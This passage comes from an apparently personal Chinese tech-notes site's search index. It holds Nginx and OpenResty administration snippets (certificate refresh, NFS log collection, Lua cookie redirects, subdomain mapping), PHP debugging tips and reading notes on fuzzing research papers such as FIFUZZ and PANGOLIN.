\u5728OSS\u8bbe\u7f6e\u7684\u53ea\u5141\u8bb8\u8fd9\u4e2aReferer_STRING\u8bbf\u95ee \u4e0d\u5141\u8bb8Referer\u4e3a\u7a7a \u589e\u52a0\u5b89\u5168\u6027 1 2 3 4 5 6 7 8 9 10 11 12 13 #!/bin/bash set -ex export PATH = /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin cd /var/www NAME = \"py3io_ATxx\" curl -o ${ NAME } .crt.new https://OSSNAME.oss-cn-REGION.aliyuncs.com/ ${ NAME } .crt -H \"Referer: Referer_STRING\" curl -o ${ NAME } .key.new https://OSSNAME.oss-cn-REGION.aliyuncs.com/ ${ NAME } .key -H \"Referer: Referer_STRING\" nginx -s reload mv ${ NAME } .crt ${ NAME } .crt.old mv ${ NAME } .key ${ NAME } .key.old mv ${ NAME } .crt.new ${ NAME } .crt mv ${ NAME } .key.new ${ NAME } .key nginx -s reload || ( mv ${ NAME } .crt.old ${ NAME } .crt ; mv ${ NAME } .key.old ${ NAME } .key )","title":"web\u670d\u52a1\u5668\u4e0a\u7684\u90e8\u7f72"},{"location":"Nginx/#nfsnginx","text":"\u8003\u8651\u4e00\u4e2a\u4e0d\u7a33\u5b9a\u7684\u5b58\u50a8\u4ecb\u8d28 \u5982\u6811\u8393\u6d3e\uff0c\u60f3\u7b80\u5355\u5730\u628a\u65e5\u5fd7\u5b58\u50a8\u5230\u5176\u4ed6\u670d\u52a1\u5668\u4e0a \u7531\u4e8enfs\u53ef\u80fd\u7531\u4e8e\u7f51\u7edchang\uff0c\u800cNginx\u5728\u65e0\u6cd5\u5199\u65e5\u5fd7\u7684\u65f6\u5019\u4e5f\u65e0\u6cd5\u63d0\u4f9bweb\u8bbf\u95ee\uff0c \u6240\u4ee5\u6211\u7684\u505a\u6cd5\u662f\u5148\u5199\u5230\u672c\u5730\uff0c\u6bcf\u4e2a\u5c0f\u65f6\u5c06\u65b0\u7684log\u8ffd\u52a0\u5230nfs\u540c\u540d .1 \u6587\u4ef6\u91cc \u7528\u5230\u7684\uff1anfs\uff0cNginx SIGUSR1\u4fe1\u53f7\uff0c\u5b9a\u65f6\u4efb\u52a1 \u670d\u52a1\u7aef\u7684nfs\u955c\u50cf\uff1a https://hub.docker.com/r/itsthenetwork/nfs-server-alpine/ docker run --restart=always -d --name nfs -v /data:/nfsshare --privileged --net=host -e SHARED_DIRECTORY=/nfsshare itsthenetwork/nfs-server-alpine \u5ba2\u6237\u7aef\uff08web\u670d\u52a1\u5668\uff09\uff1a mkdir /nfs mount SERVER_IP:/ /nfs collectlog.sh\u5199\u5230/nfs\u91cc\uff0c\u5982\u679cnfs\u53d1\u751f\u4e86hang\uff0c\u811a\u672c\u4e5f\u4e0d\u4f1a\u6267\u884c 1 2 3 4 5 6 7 8 9 10 11 #!/bin/bash export PATH = /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin cd /var/log/nginx for i in *.log ; do mv $i ${ i } .1 ; done kill -USR1 ` cat /var/run/nginx.pid ` sleep 1 for i in *.log.1 ; do cat $i >> /nfs/ $i done cron\u52a0\u5165\uff1a\u6bcf\u5c0f\u65f6\u5199\u5165\u4e00\u6b21 0 * * * * /nfs/collectlog.sh","title":"\u4f7f\u7528nfs\u5b58\u50a8Nginx\u65e5\u5fd7"},{"location":"Nginx/#openresty-luahook","text":"\u9700\u6c42\uff1a\u6709\u591a\u4e2a\u7f51\u7ad9\u7528\u6237\u8bbf\u95ee\u4e4b\u524d\u9700\u8981\u5e26\u4e0aauthtoken\uff0c\u6ca1\u6709\u8fd9\u4e2aCookie\u5219\u5148\u8df3\u8f6c\u5230\u767b\u5f55\u754c\u9762 \u4f7f\u7528openresty\u6765\u65b9\u4fbf\u5730\u5199Lua\uff1a \u5b89\u88c5\u53c2\u8003 https://openresty.org/cn/linux-packages.html sudo apt-get -y install --no-install-recommends wget gnupg ca-certificates wget -O - https://openresty.org/package/pubkey.gpg | sudo apt-key add - echo \"deb http://openresty.org/package/ubuntu $(lsb_release -sc) main\" \\ | sudo tee /etc/apt/sources.list.d/openresty.list sudo apt-get update sudo apt-get -y install openresty \u53ef\u80fd\u4f60\u4f1a\u559c\u6b22\u539f\u6765\u7684nginx\u7684\u76ee\u5f55\u8bbe\u7f6e\uff0c\u505a\u4e2a\u8f6f\u94fe\u63a5\u5457\uff1a ln - s / usr / local / openresty / nginx / logs / var / log / nginx alias nginx = openresty \u5feb\u901f\u5165\u95e8\uff1a https://openresty.org/cn/getting-started.html \u5c31\u662fcontent_by_lua_block\u91cc\u9762\u76f4\u63a5\u5199lua\u4ee3\u7801\u5373\u53ef http { server { listen 8080; location / { default_type text/html; content_by_lua_block { ngx.say(\" <p> hello, world </p> \") } } } } \u60f3\u77e5\u9053ngx\u6709\u54ea\u4e9b\u65b9\u6cd5\uff0c\u770b\u8fd9\u4e2a\u6587\u6863\uff1a https://github.com/openresty/lua-nginx-module#ngxarg \u4f8b\u5982\u83b7\u53d6http GET\u7684a\u53c2\u6570\uff1a ngx.var.arg_a , \u8bf7\u6c42\u7684Host\u53c2\u6570\uff1a ngx.var.http_host \u83b7\u53d6Cookie: \u4f7f\u7528https://github.com/cloudflare/lua-resty-cookie \u5148\u6267\u884c\uff1a wget -O /etc/openresty/cookie.lua https://github.com/cloudflare/lua-resty-cookie/raw/master/lib/resty/cookie.lua \u5728http\u4e2d\u52a0\u5165: lua_package_path \"/etc/openresty/?.lua;;\"; local ck = require \"cookie\" local cookie, err = ck:new() if not cookie then ngx.log(ngx.ERR, err) return end #\u7136\u540e\u5373\u53ef\u4f7f\u7528cookie:get(\"authtoken\") \u60f3\u4f7f\u7528rewrite_by_lua_file\u5219\u9700\u8981\u628a\u6587\u4ef6\u653e\u5728/usr/local/openresty/nginx \u7ed3\u675f\u5f53\u524d\u811a\u672c\u7ee7\u7eed\u540e\u7eed\u8bf7\u6c42\u5904\u7406 \u7528 ngx.exit(0) \u7ed3\u675f\u6574\u4e2a\u8bf7\u6c42 \u7528 ngx.exit(200) \u8df3\u8f6c\u7528 ngx.redirect(\"https://py3.io\") Lua\u7684\u4e09\u76ee\u8fd0\u7b97\uff1a a and b or c","title":"\u4f7f\u7528openresty Lua\u7f16\u7a0b\u5b9e\u73b0hook\u8df3\u8f6c"},{"location":"Nginx/#_7","text":"\u4f60\u53ef\u4ee5\u590d\u5236\u7c98\u8d34\u591a\u4e2aserver\u5757\uff0c\u4f46\u4f7f\u7528map\u662f\u4e00\u4e2a\u66f4\u4f18\u96c5\u7684\u65b9\u6848 http { map $subdomain $subdomain_port { subdomain1 12345; subdomain2 54321; default 1; } server { listen 80; server_name ~^(?P<subdomain>.+?)\\.2020\\.actf\\.lol$; location / { proxy_pass http://127.0.0.1:$subdomain_port; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; } } }","title":"\u4e0d\u540c\u5b50\u57df\u540d\u53cd\u4ee3\u5230\u4e0d\u540c\u7aef\u53e3"},{"location":"Nginx/#nginx_4","text":"\u76f4\u63a5\u7528vi\u6539\u4e86\u914d\u7f6e\u6587\u4ef6\u540e\uff0c\u5f88\u5bb9\u6613\u4e0d\u6ce8\u610f\u7f29\u8fdb\uff0c\u6709\u6ca1\u6709\u4e00\u4e2a\u81ea\u52a8prettify\u7684\u5de5\u5177\u5462 \u8fd8\u771f\u6709\uff1a https://github.com/1connect/nginx-config-formatter wget https://raw.githubusercontent.com/1connect/nginx-config-formatter/master/nginxfmt.py python3 nginxfmt.py /etc/nginx/nginx.conf","title":"Nginx\u914d\u7f6e\u6587\u4ef6\u683c\u5f0f\u5316"},{"location":"PHP/","text":"PHP \u00b6 \u663e\u793a\u9519\u8bef\u4fe1\u606f \u00b6 PHP\u8fd4\u56de500\uff0c\u4e0d\u77e5\u9053\u53d1\u751f\u4e86\u5565\uff0c\u5c31\u5728php\u6587\u4ef6\u5f00\u5934\u663e\u793a\u6240\u6709\u9519\u8bef\uff1a <?php ini_set ( 'display_errors' , true ); error_reporting ( E_ALL ); \u5168\u9875\u9762iframe \u00b6 <!DOCTYPE html> < body style = \"padding:0; margin:0;\" > < iframe src = \"https://py3.io\" style = \"visibility: visible;height: 100%; position:absolute\" allowtransparency = \"true\" marginheight = \"0\" marginwidth = \"0\" frameborder = \"0\" width = \"100%\" ></ iframe > </ body ></ html >","title":"PHP"},{"location":"PHP/#php","text":"","title":"PHP"},{"location":"PHP/#_1","text":"PHP\u8fd4\u56de500\uff0c\u4e0d\u77e5\u9053\u53d1\u751f\u4e86\u5565\uff0c\u5c31\u5728php\u6587\u4ef6\u5f00\u5934\u663e\u793a\u6240\u6709\u9519\u8bef\uff1a <?php ini_set ( 'display_errors' , true ); error_reporting ( E_ALL );","title":"\u663e\u793a\u9519\u8bef\u4fe1\u606f"},{"location":"PHP/#iframe","text":"<!DOCTYPE html> < body style = \"padding:0; margin:0;\" > < iframe src = \"https://py3.io\" style = \"visibility: visible;height: 100%; position:absolute\" allowtransparency = \"true\" marginheight = \"0\" marginwidth = \"0\" frameborder = \"0\" width = \"100%\" ></ iframe > </ body ></ html >","title":"\u5168\u9875\u9762iframe"},{"location":"PaperReading/","text":"Paper Reading \u00b6 Fuzzing error-handling code using context-sensitive software fault injection \u00b6 USENIX2020 PDF \u8868\u8fbe\uff1a augment \u8bf4\u81ea\u5df1\u7684fuzzer\u80fd\u6709\u6548\u8865\u5145\u589e\u5f3a\u73b0\u6709\u7684fuzzing\u6280\u672f and we are still waiting for the response of remaning ones \u63d0\u4ea4\u4e86bug\u7b49\u5f85\u56de\u590d This manual study is required for gaining the insights into building the automated static analysis \u624b\u5de5\u5206\u6790\u662f\u6709\u5fc5\u8981\u7684 \u9519\u8bef\u5904\u7406\u7684\u4ee3\u7801\u4e00\u4e9b\u53ea\u80fd\u5728\u5076\u7136\u60c5\u51b5\u4e0b\u89e6\u53d1 \u5982\u5185\u5b58\u4e0d\u591f \u7f51\u7edc\u8fde\u63a5\u5931\u8d25 \u8fd9\u7bc7\u6587\u7ae0\u7684\u6838\u5fc3\u662fSFI \u4e0a\u4e0b\u6587\u654f\u611f\u7684\u8f6f\u4ef6\u9519\u8bef\u6ce8\u5165 \u53d1\u73b0\u4e86317\u4e2aalert \u6839\u636e\u6839\u672c\u539f\u56e0\u5206\u621050\u4e2aunique bugs error site \u6ce8\u5165\u9519\u8bef\u7684\u4f4d\u7f6e \u6bd4\u5982malloc \u73b0\u6709\u7684\u6280\u672f\u6ca1\u8003\u8651\u4e0a\u4e0b\u6587\uff08\u8c03\u7528\u6808\uff09\u6ce8\u5165\u9519\u8bef\u90a3\u5c31\u4e00\u5b9a\u4f1a\u9519 \u8fd9\u6837\u4f1a\u9519\u8fc7\u4e00\u4e9bbug \u65b9\u6cd5\uff1a 1. \u9759\u6001\u5206\u6790\u627eerror sites \u8fd0\u884c\u65f6\u6709\u53ef\u80fd\u51fa\u9519\u7684\u5730\u65b9 \u53ea\u627e\u5e93\u51fd\u6570\u907f\u514d\u91cd\u590d\uff1b\u627e\u6ee1\u8db3\u6761\u4ef6\u7684\u51fd\u6570\u8c03\u7528\uff1a\u8fd4\u56de\u7684\u662f\u6307\u9488\u6216\u6574\u6570\u3001\u8fd4\u56de\u503c\u4f1a\u548cNULL\u6216\u80050\u6bd4\u8f83\uff0c\u5b9a\u4e49\u4e00\u4e2a\u6bd4\u8f83\u6b21\u6570/\u603b\u6b21\u6570\u7684\u9608\u503cR=0.6 2. \u8fd0\u884c\u88ab\u6d4b\u7a0b\u5e8f \u6536\u96c6\u5230\u8fbe\u6bcf\u4e2aerror site\u80fd\u6709\u54ea\u4e9bcalling context\uff0c\u4ee5\u53ca\u5f53\u524d\u7684coverage 3. \u521b\u5efa\u9519\u8bef\u5e8f\u5217 \u9519\u8bef\u5e8f\u5217\u7684\u6bcf\u4e00\u4e2a\u4e0d\u662ferror site \u800c\u662ferror point \u5176\u4e2dCallCtx \u662f \u7684\u6570\u7ec4 \u5177\u4f53\u7528\u54c8\u5e0c\u8868\u5b58\u50a8 4. \u53d8\u5f02\u9519\u8bef\u5e8f\u5217 5. \u8fd0\u884c 6. \u770b\u770b\u662f\u5426\u6709\u65b0\u7684coverage \u5faa\u73af \u540c\u65f6\u53d8\u5f02\u9519\u8bef\u5e8f\u5217\u548c\u7a0b\u5e8f\u8f93\u5165 \u8d21\u732e\uff1a * \u505a\u4e86\u4e24\u4e2a\u624b\u5de5\u5206\u6790\uff1a42%\u7684\u9519\u8bef\u5904\u7406\u4ee3\u7801\u90fd\u662f\u5904\u7406\u5076\u7136\u9519\u8bef\uff0c\u5176\u4e2d\u5f88\u5c11\u80fd\u88ab\u73b0\u6709\u7684\u6280\u672f\u89e6\u53d1 * \u57fa\u4e8e\u4e0a\u4e0b\u6587\u654f\u611f\u7684SFI\u7684fuzzing\u57fa\u7840 \u52a8\u6001\u6ce8\u5165\u9519\u8bef\uff0c\u8003\u8651\u4e86\u8c03\u7528\u5173\u7cfb * FIFUZZ \u7b2c\u4e00\u4e2a\u7cfb\u7edf\u6027\u8003\u8651\u4e86\u4e0d\u540c\u8c03\u7528\u5173\u7cfb\u7684\u6d4b\u8bd5\u9519\u8bef\u5904\u7406\u4ee3\u7801\u7684fuzzing\u6846\u67b6 * \u6d4b\u4e869\u4e2aC\u8bed\u8a00\u7a0b\u5e8f \u53d1\u73b0\u4e8650\u4e2abug \u548cAFL AFLFast AFLSmart FairFuzz\u6bd4\u8f83\u80fd\u53d1\u73b0\u5f88\u591a\u522b\u4eba\u53d1\u73b0\u4e0d\u4e86\u7684bug \u867d\u7136\u9519\u8bef\u5076\u7136\u89e6\u53d1\uff0c\u4f46\u5728adversarial setting\u4e0b\u5374\u53ef\u4ee5\u7a33\u5b9a\u89e6\u53d1 \u5982\u653b\u51fb\u8005\u8017\u5c3d\u5185\u5b58\u80fd\u53ef\u9760\u5730\u8ba9malloc\u8fd4\u56deNULL \uff1b\u540e\u9762\u4e5f\u63d0\u5230\u653b\u51fb\u7a97\u53e3\u592a\u5c0f\u7684\u8bdd \u4e0d\u80fd\u6210\u529f \u5206\u6790\u7684\u8f6f\u4ef6\uff1avim bision ffmpeg nasm catdoc clamav cflow gif2png+libpng openssl \u6bcf\u4e2a\u9009100\u4e2a\u6e90\u4ee3\u7801\u770b\u53d1\u73b0\uff1a 42%\u5076\u7136\u9519\u8bef\uff0c70%\u68c0\u67e5\u8fd4\u56de\u503c\u662f\u4e0d\u662f\u8868\u793a\u9519\u8bef \u770bCVE\u53d1\u73b0fuzzing\u53d1\u73b0\u7684CVE\u4e2d31%\u548c\u9519\u8bef\u5904\u7406\u6709\u5173 \u4f46\u53ea\u67099%\u662f\u5076\u7136\u9519\u8bef \u4e00\u6b21\u53d8\u5f02\u4e00\u4e2a \u5982\u679c\u6ca1\u53d1\u73b0\u65b0\u7684coverage\u5c31\u629b\u5f03 ASan\u5f15\u5165\u4e86\u592a\u5927\u7684runtime overhead \u5b9e\u9a8c\u5206\u4e24\u7ec4 \u7528asan\u548c\u4e0d\u7528 \u9009vim\u4e00\u4e2a\u7a0b\u5e8f\u6765\u663e\u793a24\u5c0f\u65f6\u5185 \u6709\u7528\u7684\u9519\u8bef\u5e8f\u5217\u3001\u7a0b\u5e8f\u8f93\u5165\u5206\u522b\u968f\u65f6\u95f4\u589e\u957f\u7684\u66f2\u7ebf \u5b9e\u9a8c\u7ed3\u679c\u7684\u8868\u683c\uff1a\u5206asan\u548c\u4e0d\u7528asan\uff0c\u4ea7\u751f\u4e86\u591a\u5c11\u9519\u8bef\u5e8f\u5217\u548cinput \u591a\u5c11\u6709\u7528\uff0c\u53d1\u73b0\u7684bug\u7684\u5206\u7c7b \u4e09\u7c7b\uff1a\u8fd4\u56deNULL\uff0cmalloc\u5931\u8d25\uff0cassert \u9644\u5f55\u7ed950\u4e2a\u968f\u673a\u9009\u7684alerts \u7a0b\u5e8f\u3001\u89e6\u53d1\u5e8f\u5217Error points\u3001\u5d29\u7684\u6e90\u4ee3\u7801\u884c\u53f7\u3001\u9519\u8bef\u7c7b\u522b\u3001\u53cd\u9988\u4fee\u590d\u72b6\u6001 \u53d1\u73b0\u768446\u4e2a\u548c\u9519\u8bef\u5904\u7406\u76f8\u5173\u7684bug\u4e2d \u53ea\u67094\u4e2a\u9700\u8981\u4e00\u4e2a\u4ee5\u4e0a\u7684bug\u6ce8\u5165 \u4e5f\u5c31\u8bf4\u5927\u90e8\u5206bug\u4e00\u4e2a\u9519\u8bef\u5c31\u80fd\u89e6\u53d1\u4e86\uff1b\u5927\u90e8\u5206bug\u90fd\u662f\u56e0\u4e3a\u88ab\u8c03\u7528\u7684\u51fd\u6570\u6b63\u786e\u5904\u7406\u4e86\u5f02\u5e38 \u4f46\u8c03\u7528\u8005\u6ca1\u6709\u2014\u2014\u5f00\u53d1\u8005\u7ecf\u5e38\u7531\u4e8e\u590d\u6742\u7684\u8c03\u7528\u5728error propagation\u4e0a\u72af\u9519\u8bef \u548c\u5176\u4ed6fuzzer\u6bd4\u8f83 \u8bf4\u81ea\u5df1\u7684coverage\u66f4\u9ad8 \u81ea\u5df1\u6ca1\u6bd4\u4eba\u5bb6\u5f3a\u5c31\u8bf4We believe that if\u6211\u4eec\u4e5f\u5b9e\u73b0\u4ed6\u4eec\u7684fuzzing\u8fc7\u7a0b\uff0c\u90a3\u5c31\u4f1a\u66f4\u597d discussion: \u9519\u8bef\u4f4d\u7f6e\u7684\u63d0\u53d6 \u7684 \u8bef\u62a5\uff1a \u6709\u4e9b\u51fd\u6570\u867d\u7136\u7ecf\u5e38\u8ddf0\u6bd4\u8f83\u4f46\u4e0d\u4f1a\u8fd4\u56de\u9519\u8bef \u5982strstr \u901a\u8fc7\u5206\u6790\u5b9a\u4e49\u548c\u8c03\u7528\u56fe\u68c0\u67e5\u662f\u5426\u771f\u7684\u80fd\u8fd4\u56de\u8868\u793a\u9519\u8bef\u7684\u9519\u8bef\u503c\uff1b\u51fd\u6570\u7684\u8f93\u5165\u4e00\u5b9a\u5148\u8f6c\u6362\u6210\u6709\u6548\u7684\u6570\u636e \u7528\u7b26\u53f7\u6267\u884c\u6765\u5206\u6790 \u5bf9\u6bcf\u4e2a\u51fd\u6570\u8c03\u7528\u8ba1\u7b97\u7ea6\u675f \u9519\u8bef\u68c0\u6d4b \u7684 \u6f0f\u62a5\uff1a\u4e3a\u4e86\u907f\u514d\u91cd\u590d\u6ce8\u5165\u53ea\u8003\u8651\u4e86\u5e93\u51fd\u6570\uff0c\u4f46\u6709\u4e9b\u5f00\u53d1\u8005\u81ea\u5df1\u5199\u7684\u6ca1\u8c03\u7528\u4efb\u4f55\u5e93\u51fd\u6570\u4e5f\u80fd\u8fd4\u56de\u9519\u8bef\uff1bcoverage\u6ca1\u5230 FIFUZZ\u4e0d\u80fd\u63d0\u4f9b\u6240\u6709\u53ef\u80fd\u7684\u7a0b\u5e8f\u8f93\u5165\u548c\u914d\u7f6e\uff1b\u7528ASan\u7684\u5c40\u9650 \u4f46\u53ef\u4ee5\u6269\u5c55\u7528MSan UBSan TSan \u76f8\u5173\u7684paper: \u8f7b\u91cf\u7ea7\u8fd0\u884c\u65f6\u76d1\u6d4b\uff1a\u57fa\u4e8e\u786c\u4ef6\u7684tracing [3, 31]\uff0c call-path inferring[42] \u7528\u9759\u6001\u5206\u6790\u627e\u9519\u8bef\u5904\u7406\u7684bug [28, 32, 33, 37, 53] PairCheck[9] \u7edf\u8ba1\u5206\u6790\u627e\u8d44\u6e90acquire\u548crelease\u7684pair\uff0c\u627e\u9519\u8bef\u5904\u7406\u4e2d\u6ca1\u6709release \u6700\u540econclusion\u6700\u540e\u4e00\u6bb5\u8bf4\u6539\u8fdb \u51cf\u5c11\u8bef\u62a5\uff1b\u63d0\u9ad8\u6027\u80fd\uff1b\u5176\u4ed6\u7f16\u7a0b\u8bed\u8a00 plan to test the program in other programming languages \uff08such as C++ and Java\uff09 PANGOLIN: Incremental Hybrid Fuzzing with Polyhedral Path Abstraction \u00b6 SP2020 PDF \u4e00\u53e5\u8bdd\u6982\u62ec\uff1a\u6539\u8fdbQSYM\u6df7\u5408fuzzing \u7f13\u5b58\u6c42\u89e3\u51fa\u6765\u7684\u53d6\u503c\u8303\u56f4\u7528\u591a\u8fb9\u5f62\u8868\u793a \u6765\u66f4\u597d\u7684\u53d8\u5f02\u66f4\u5feb\u7684\u6c42\u89e3 \u5355\u8bcd\u4e0e\u8868\u8fbe\uff1a sluggish \u6027\u80fd\u4e0d\u884c \u592a\u6162 succinct \u7b80\u6d01\u7684 \u53d6\u5f97\u5e73\u8861 a sweet spot between \u2026 obstruct \u963b\u788d we followed the standard instructions in the previous paper \u8bf4\u81ea\u5df1\u7684\u65b9\u6cd5\u662f\u6309\u7167\u522b\u4eba\u5efa\u8bae\u7684 orthogonal \u8bf4\u522b\u4eba\u7684\u7814\u7a76\u548c\u81ea\u5df1\u7684\u4e0d\u51b2\u7a81\u53ef\u4ee5\u4e92\u8865 intro \u7b2c\u4e00\u6bb5 \u4ecb\u7ecdhybrid fuzzing\u5f88\u6709\u7528\uff1b\u7b2c\u4e8c\u6bb5\u8bf4\u73b0\u5728\u7684\u65b9\u6cd5\u4e0d\u884c \u63d0\u51fa\u95ee\u9898\u4e0dincremental \u6700\u540e\u4e00\u53e5\u63d0However, intuitively\u5e94\u8be5\u53ef\u4ee5\u8fd9\u4e48\u505a\uff1b\u4e4b\u540e\u4e3e\u4f8b\u5b50\uff1b\u6838\u5fc3\u7684\u4e24\u70b9\u2014\u2014\u7528\u591a\u8fb9\u5f62\u7684\u8def\u5f84\u7ea6\u675f\u628a\u79cd\u5b50\u53d8\u5f02\u8f6c\u6362\u6210\u5728\u4e00\u4e2a\u591a\u8fb9\u5f62\u5185\u53d6\u6837\u3001\u7528\u7ea6\u675f\u964d\u4f4e\u7ea6\u675f\u6c42\u89e3\u590d\u6742\u5ea6\u51cf\u5c0f\u53ef\u884c\u89e3\u7a7a\u95f4 \u4ece\u800c\u52a0\u901f\u7ea6\u675f\u6c42\u89e3\uff1b\u7136\u540e\u8bf4\u81ea\u5df1\u6d4b\u4e86\u4e00\u4e0b \u6548\u679c\u6bd4state of art\u597d10%~30%\u7684coverage\uff0c\u5728LAVA-M\u80fd\u591a\u53d1\u73b0500+bugs\uff0c\u53d1\u73b0\u65b0\u768441\u4e2abug \u62ff\u52308\u4e2aCVE \u968f\u673a\u53d8\u5f02\u7684\u7a7a\u95f4\u603b\u662f\u592a\u5927\u4e86 \u7ea6\u675f\u7684\u62bd\u8c61 \u6709 interval [32], octagon [33], and polyhedral [34]. \u90fd\u662fsound\u7684\uff08\u5305\u542b\u6240\u6709\u76ee\u6807\u70b9\uff09\uff0c\u4f46polyhedral\u6709\u6700\u597d\u7684precision \u5305\u542b\u6700\u5c11\u7684\u975e\u76ee\u6807\u70b9 \u91c7\u6837\u7528Dikin walk algorithm \u80fd\u4fdd\u8bc1\u5747\u5300\u91c7\u6837 \u4fdd\u8bc1\u591a\u6837\u6027\uff1a\u6bcf\u4e24\u4e2a\u91c7\u6837\u4e4b\u95f4\u7684\u8ddd\u79bb\u90fd\u8981\u5927\u4e8e\u4e00\u4e2a\u52a8\u6001\u8fb9\u754c \u5177\u4f53\u505a\u6cd5\u5e76\u4e0d\u76f2\u76ee\u8ba1\u7b97x+y\u548cx-y\uff0c\u800c\u662f\u52a0\u5165\u7ea6\u675f\u4e2d\u7684\u7ebf\u6027\u8868\u8fbe\u5f0f \u59825x+y \u5e94\u8be5\u91c7\u591a\u5c11\u6837\u672c\uff1f\u8d8a\u96becover\u7684\u9700\u8981\u8d8a\u591a\uff0c\u8d8a\u591a\u4f9d\u8d56\u5b83\u7684\u8def\u5f84\u9700\u8981\u8d8a\u591a evaluation \u4e09\u4e2aRQ\u7814\u7a76\u95ee\u9898\uff1a1. \u6bd4\u73b0\u5728\u6700\u597d\u7684fuzzer\u80fd\u4e0d\u80fd\u53d1\u73b0\u66f4\u591a\u7684bug\uff1b2.\u80fd\u4e0d\u80fd\u66f4\u9ad8\u7684coverage\uff1b3. \u53d8\u5f02\u65b9\u6cd5\u7684\u6709\u6548\u6027 \u5b9e\u9a8c\u7528\u4e86\u4e24\u4e2aafl\uff0cangora\u6709-j 2\uff0c\u4f46T-Fuzz\u4e0d\u652f\u6301 \u4e5f\u5c31\u76f4\u63a5\u8dd1\u4e86 \u9009seed\u7684\u65b9\u5f0f\uff1a\u7528AFL\u63d0\u4f9b\u7684seed\uff0c\u7528\u4eba\u5bb6\u4ee3\u7801\u91cc\u81ea\u5e26\u7684\u6d4b\u8bd5\u6837\u4f8b \u91cd\u590d10\u6b21 \u6bd4\u8f83\u4e86\u6548\u679c\u597d\u4e4b\u540e\u8ba8\u8bba\u4e3a\u5565\u6ca1\u80fd\u53d1\u73b0LAVA-M\u7684\u6240\u6709bug\uff1f\u8bf4\u8fd9\u662fQSYM\u7684\u95ee\u9898 \u7f3a\u5c11\u5bf9\u5e95\u5c42\u7cfb\u7edf\u8c03\u7528\u7684\u5efa\u6a21\u5982who\u7528\u7684x2nrealloc\uff0c\u4e0d\u652f\u6301\u6d6e\u70b9\u6570\u7ea6\u675f\u3002\u4f46\u662f\u8fd9\u4e9b\u9650\u5236\u4e0d\u662f\u8fd9\u7bc7work\u8981\u89e3\u51b3\u7684\u95ee\u9898\uff0cand we leave them as our future work. crash\u53bb\u91cd\u7528\u7684 afl-cmin -C \u53d1\u73b0\u4e86T-Fuzz\u5bf9\u5927\u7a0b\u5e8f\u6709scalability issues \u6240\u4ee5\u5c31\u6ca1\u6709\u6bd4\u8f83coverage \u6bd4QSYM\u597d\uff0c\u539f\u56e0\u662fqsym\u5bf9\u6bcf\u4e2abranch\u53ea\u751f\u6210\u4e00\u4e2aseed\uff0c\u8fd9\u6837\u4f1a\u6f0f\u6389\u4e00\u4e9b\u2014\u2014\u8986\u76d6\u5230\u4e00\u4e2abranch\u5e76\u4e0d\u610f\u5473\u7740\u5c31\u80fd\u89e6\u53d1\u6f0f\u6d1e The performance of constrained mutation\uff1a\u6bd4\u8f83\u63d0\u51fa\u7684constrained mutation\u548cSMTSampler \u770b\u7ed9\u5b9atime buget\u5206\u522b3s 5s 10s\u7684\u60c5\u51b5\u4e0b\u80fd\u89e3\u51fa\u591a\u5c11 \u8ba1\u7b97\u5e73\u5747\u65f6\u95f4\u7684\u65f6\u5019\u5982\u679c\u4e0d\u80fd\u89e3\u51b3\u5c31\u6309\u4e0a\u9650\u2014\u2014\u8d85\u8fc795%\u7684\u7ea6\u675f\u90fd\u80fd\u57283\u79d2\u949f\u5185\u641e\u5b9a\u3002\u603b\u4e4b\uff0c\u6211\u4eec\u7684\u65b9\u6cd5\u6bd4SMTSampler\u6548\u7387\u548c\u6709\u6548\u6027\u90fd\u5f3a \u4e3a\u5565\u5462\uff1f\u51cf\u5c11\u4e86\u7ea6\u675f\u6c42\u89e3\u5668\u7684\u8c03\u7528\u3001\u4fdd\u8bc1\u4e86\u5747\u5300\u5206\u5e03 related work \u79cd\u5b50\u7684\u4f18\u5148\u9009\u62e9\u548c\u8c03\u5ea6 \u662f\u57fa\u4e8e\u7a0b\u5e8f\u7ed3\u6784\u7684 \u5ffd\u89c6\u4e86\u8f93\u5165\u7684\u5b9e\u9645\u53d6\u503c\u7a7a\u95f4 \u76f8\u6bd4\u4e8eKLEE\u7f13\u5b58\u4e86constraint\uff0c\u6211\u4eec\u7f13\u5b58\u4e86\u539f\u59cb\u8def\u5f84\u7ea6\u675f\u7684\u7b80\u5316\u5f62\u5f0f path abstraction \u5982\u4f55\u6709\u6548\u7684\u5c06concolic execution\u548cfuzzing\u7ed3\u5408is always under consideration \u5c3d\u7ba1\u6709\u5185\u5b58\u5feb\u7167\u7684\u6280\u672f\u6765\u4fdd\u5b58\u7a0b\u5e8f\u72b6\u6001[7] \u201cUnleashing mayhem on binary code\u201d\uff0c\u4f46\u5bf9hybrid fuzzing\u6765\u8bf4\u592a\u6162\u4e86 Full speed Fuzzing: Reducing Fuzzing Overhead \u00b6 \u4e00\u53e5\u8bdd\u6982\u62ec\uff1a \u6bcf\u4e2a\u57fa\u672c\u5757\u7b2c\u4e00\u4e2a\u5b57\u8282\u6539\u6210CC\u89e6\u53d1\u4e2d\u65ad\uff0c\u4e0d\u9700\u8981\u8017\u65f6\u5730\u8bb0\u5f55coverage\u4e86\uff0c\u53d1\u73b0\u65b0\u7684\u57fa\u672c\u5757\u5c31\u80fd\u81ea\u52a8\u77e5\u9053 \u5355\u8bcd\uff1a tracking apparatuse\u63d2\u6869\u4ee3\u7801\u505a\u7684\u4e8b\u60c5 niche \u5408\u5b9c\u7684\u5c0f\u73af\u5883 \u8fd9\u91cc\u4f3c\u4e4e\u662f\u53d7\u9650\u7684\u610f\u601d As applications of directed fuzzing are generally niche, such as taint tracking [16] or patch testing [31], coverage-guided fuzzing\u2019s wider scope makes it more popular among the fuzzing community [5], [6], [4], [3]. narrow \u533a\u522b\u4e0d\u5927 results in Section VI suggest that the performance gap is much narrower. convincingly \u6bd4\u5176\u4ed6\u4eba\u597d A12 excceds 0.71 performance-taxing \u8017\u65f6 per-variant geometric mean\u5206\u7ec4\u8ba1\u7b97\u5747\u503c deficit \u5f15\u5165\u7684overhead: \u2026 far outweighs the performance deficit from trimming and calibration tracing is not a technical challenge \u6ca1\u505a\u7684\u4e1c\u897fclaim\u4e0d\u96be\u505a graciously \u611f\u8c22\u5176\u4ed6\u4eba \u4eba\u5bb6\u7684idea\uff1a \u628a\u7a0b\u5e8f\u53d8\u6210\u4e00\u4e2a\u80fd\u81ea\u5df1\u62a5\u544a\u6709\u6ca1\u6709\u53d1\u73b0\u65b0\u7684basic 